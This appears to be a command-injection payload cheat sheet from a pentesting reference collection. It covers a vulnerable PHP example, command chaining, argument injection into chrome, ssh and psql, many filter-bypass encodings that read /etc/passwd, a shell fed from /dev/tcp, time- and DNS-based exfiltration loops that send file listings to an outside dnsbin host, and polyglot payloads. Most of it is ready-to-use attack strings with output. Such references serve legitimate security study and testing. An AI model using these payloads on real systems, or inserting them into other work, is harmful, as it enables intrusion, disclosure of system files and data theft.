# Command Injection

> Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.

## Summary

* [Tools](#tools)
* [Exploits](#exploits)
  * [Basic commands](#basic-commands)
  * [Chaining commands](#chaining-commands)
  * [Argument injection](#argument-injection)
  * [Inside a command](#inside-a-command)
* [Filter Bypasses](#filter-bypasses)
  * [Bypass without space](#bypass-without-space)
  * [Bypass with a line return](#bypass-with-a-line-return)
  * [Bypass with backslash newline](#bypass-with-backslash-newline)
  * [Bypass characters filter via hex encoding](#bypass-characters-filter-via-hex-encoding)
  * [Bypass blacklisted words](#bypass-blacklisted-words)
   * [Bypass with single quote](#bypass-with-single-quote)
   * [Bypass with double quote](#bypass-with-double-quote)
   * [Bypass with backticks](#bypass-with-backticks)
   * [Bypass with backslash and slash](#bypass-with-backslash-and-slash)
   * [Bypass with $@](#bypass-with-)
   * [Bypass with $()](#bypass-with--1)
   * [Bypass with variable expansion](#bypass-with-variable-expansion)
   * [Bypass with wildcards](#bypass-with-wildcards)
* [Data Exfiltration](#data-exfiltration)
  * [Time based data exfiltration](#time-based-data-exfiltration)
  * [DNS based data exfiltration](#dns-based-data-exfiltration)
* [Polyglot Command Injection](#polyglot-command-injection)
* [Tricks](#tricks)
  * [Backgrounding long running commands](#backgrounding-long-running-commands)
  * [Remove arguments after the injection](#remove-arguments-after-the-injection)
* [Labs](#labs)
* [Challenge](#challenge)
* [References](#references)


## Tools

* [commixproject/commix](https://github.com/commixproject/commix) - Automated All-in-One OS command injection and exploitation tool
* [projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh) - An OOB interaction gathering server and client library


## Exploits

Command injection, also known as shell injection, is a type of attack in which the attacker can execute arbitrary commands on the host operating system via a vulnerable application. This vulnerability can exist when an application passes unsafe user-supplied data (forms, cookies, HTTP headers, etc.) to a system shell. In this context, the system shell is a command-line interface that processes commands to be executed, typically on a Unix or Linux system.

The danger of command injection is that it can allow an attacker to execute any command on the system, potentially leading to full system compromise.

**Example of Command Injection with PHP**:    
Suppose you have a PHP script that takes a user input to ping a specified IP address or domain:

```php
<?php
    $ip = $_GET['ip'];
    system("ping -c 4 " . $ip);
?>
```

In the above code, the PHP script uses the `system()` function to execute the `ping` command with the IP address or domain provided by the user through the `ip` GET parameter.

If an attacker provides input like `8.8.8.8; cat /etc/passwd`, the actual command that gets executed would be: `ping -c 4 8.8.8.8; cat /etc/passwd`.

This means the system would first `ping 8.8.8.8` and then execute the `cat /etc/passwd` command, which would display the contents of the `/etc/passwd` file, potentially revealing sensitive information.


### Basic commands

Execute the command and voila :p

```powershell
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
...
```


### Chaining commands

In many command-line interfaces, especially Unix-like systems, there are several characters that can be used to chain or manipulate commands. 


* `;` (Semicolon): Allows you to execute multiple commands sequentially.
* `&&` (AND): Execute the second command only if the first command succeeds (returns a zero exit status).
* `||` (OR): Execute the second command only if the first command fails (returns a non-zero exit status).
* `&` (Background): Execute the command in the background, allowing the user to continue using the shell.
* `|` (Pipe):  Takes the output of the first command and uses it as the input for the second command.

```powershell
command1; command2   # Execute command1 and then command2
command1 && command2 # Execute command2 only if command1 succeeds
command1 || command2 # Execute command2 only if command1 fails
command1 & command2  # Execute command1 in the background
command1 | command2  # Pipe the output of command1 into command2
```


### Argument Injection

Gain a command execution when you can only append arguments to an existing command.
Use this website [Argument Injection Vectors - Sonar](https://sonarsource.github.io/argument-injection-vectors/) to find the argument to inject to gain command execution.

* Chrome
    ```ps1
    chrome '--gpu-launcher="id>/tmp/foo"'
    ```

* SSH
    ```ps1
    ssh '-oProxyCommand="touch /tmp/foo"' foo@foo
    ```

* psql
    ```ps1
    psql -o'|id>/tmp/foo'
    ```


### Inside a command

* Command injection using backticks. 
  ```bash
  original_cmd_by_server `cat /etc/passwd`
  ```
* Command injection using substitution
  ```bash
  original_cmd_by_server $(cat /etc/passwd)
  ```


## Filter Bypasses

### Bypass without space

* `$IFS` is a special shell variable called the Internal Field Separator. By default, in many shells, it contains whitespace characters (space, tab, newline). When used in a command, the shell will interpret `$IFS` as a space. `$IFS` does not directly work as a separator in commands like `ls`, `wget`; use `${IFS}` instead. 
  ```powershell
  cat${IFS}/etc/passwd
  ls${IFS}-la
  ```
* In some shells, brace expansion generates arbitrary strings. When executed, the shell will treat the items inside the braces as separate commands or arguments.
  ```powershell
  {cat,/etc/passwd}
  ```
* Input redirection. The < character tells the shell to read the contents of the file specified. 
  ```powershell
  cat</etc/passwd
  sh</dev/tcp/127.0.0.1/4242
  ```
* ANSI-C Quoting 
  ```powershell
  X=$'uname\x20-a'&&$X
  ```
* The tab character can sometimes be used as an alternative to spaces. In ASCII, the tab character is represented by the hexadecimal value `09`.
  ```powershell
  ;ls%09-al%09/home
  ```
* In Windows, `%VARIABLE:~start,length%` is a syntax used for substring operations on environment variables.
  ```powershell
  ping%CommonProgramFiles:~10,-18%127.0.0.1
  ping%PROGRAMFILES:~10,-5%127.0.0.1
  ```


### Bypass with a line return

Commands can also be run in sequence with newlines

```bash
original_cmd_by_server
ls
```


### Bypass with backslash newline

* Commands can be broken into parts by using backslash followed by a newline
  ```powershell
  $ cat /et\
  c/pa\
  sswd
  ```
* URL encoded form would look like this:
  ```powershell
  cat%20/et%5C%0Ac/pa%5C%0Asswd
  ```


### Bypass characters filter via hex encoding

```powershell
swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
/etc/passwd

swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
root:x:0:0:root:/root:/bin/bash
```


### Bypass characters filter

Commands execution without backslash and slash - linux bash

```powershell
swissky@crashlab:~$ echo ${HOME:0:1}
/

swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ echo . | tr '!-0' '"-1'
/

swissky@crashlab:~$ tr '!-0' '"-1' <<< .
/

swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
root:x:0:0:root:/root:/bin/bash
```


### Bypass Blacklisted words

#### Bypass with single quote

```powershell
w'h'o'am'i
wh''oami
```

#### Bypass with double quote

```powershell
w"h"o"am"i
wh""oami
```

#### Bypass with backticks

```powershell
wh``oami
```

#### Bypass with backslash and slash

```powershell
w\ho\am\i
/\b\i\n/////s\h
```

#### Bypass with $@

`$0`: Refers to the name of the script if it's being run as a script. If you're in an interactive shell session, `$0` will typically give the name of the shell.

```powershell
who$@ami
echo whoami|$0
```


#### Bypass with $()

```powershell
who$()ami
who$(echo am)i
who`echo am`i
```

#### Bypass with variable expansion

```powershell
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

#### Bypass with wildcards

```powershell
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```


## Data Exfiltration

### Time based data exfiltration

Extracting data : char by char

```powershell
swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```

### DNS based data exfiltration

Based on the tool from `https://github.com/HoLyVieR/dnsbin` also hosted at dnsbin.zhack.ca

```powershell
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```powershell
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```

Online tools to check for DNS based data exfiltration:

- dnsbin.zhack.ca
- pingb.in


## Polyglot Command Injection

A polyglot is a piece of code that is valid and executable in multiple programming languages or environments simultaneously. When we talk about "polyglot command injection," we're referring to an injection payload that can be executed in multiple contexts or environments.

* Example 1:
  ```powershell
  Payload: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

  # Context inside commands with single and double quote:
  echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  ```
* Example 2: 
  ```powershell
  Payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/

  # Context inside commands with single and double quote:
  echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
  echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
  echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
  ```


## Tricks

### Backgrounding long running commands

In some instances, you might have a long running command that gets killed by the process injecting it timing out.
Using `nohup`, you can keep the process running after the parent process exits.

```bash
nohup sleep 120 > /dev/null &
```

### Remove arguments after the injection

In Unix-like command-line interfaces, the `--` symbol is used to signify the end of command options. After `--`, all arguments are treated as filenames and arguments, and not as options.


## Labs

* [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
* [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
* [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
* [Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
* [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)


## Challenge

Challenge based on the previous tricks, what does the following command do:

```powershell
g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
```


## References

* [SECURITY CAFÉ - Exploiting Timed Based RCE](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
* [Bug Bounty Survey - Windows RCE spaceless](https://web.archive.org/web/20180808181450/https://twitter.com/bugbsurveys/status/860102244171227136)
* [No PHP, no spaces, no $, no { }, bash only - @asdizzle](https://twitter.com/asdizzle_/status/895244943526170628)
* [#bash #obfuscation by string manipulation - Malwrologist, @DissectMalware](https://twitter.com/DissectMalware/status/1025604382644232192)
* [What is OS command injection - portswigger](https://portswigger.net/web-security/os-command-injection)
* [Argument Injection Vectors - Sonar](https://sonarsource.github.io/argument-injection-vectors/)
